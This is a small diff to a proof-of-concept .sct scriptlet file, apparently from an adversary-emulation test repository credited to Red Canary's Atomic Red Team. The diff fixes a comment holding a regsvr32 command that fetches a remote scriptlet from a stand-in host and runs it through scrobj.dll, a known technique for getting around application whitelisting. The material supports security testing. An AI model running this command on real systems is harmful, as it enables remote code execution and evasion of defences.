@@ -4,7 +4,7 @@
     
     progid="PoC"
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
-	<Soruce Red Canary - Atomic Read Team !-- regsvr32 /s /u /i:http://example.com/file.sct scrobj.dll -->
+	<!-- Soruce Red Canary - Atomic Read Team regsvr32 /s /u /i:http://example.com/file.sct scrobj.dll -->
 
 	<!-- .sct files when downloaded, are executed from a path like this -->
 	<!-- Please Note, file extenstion does not matter -->
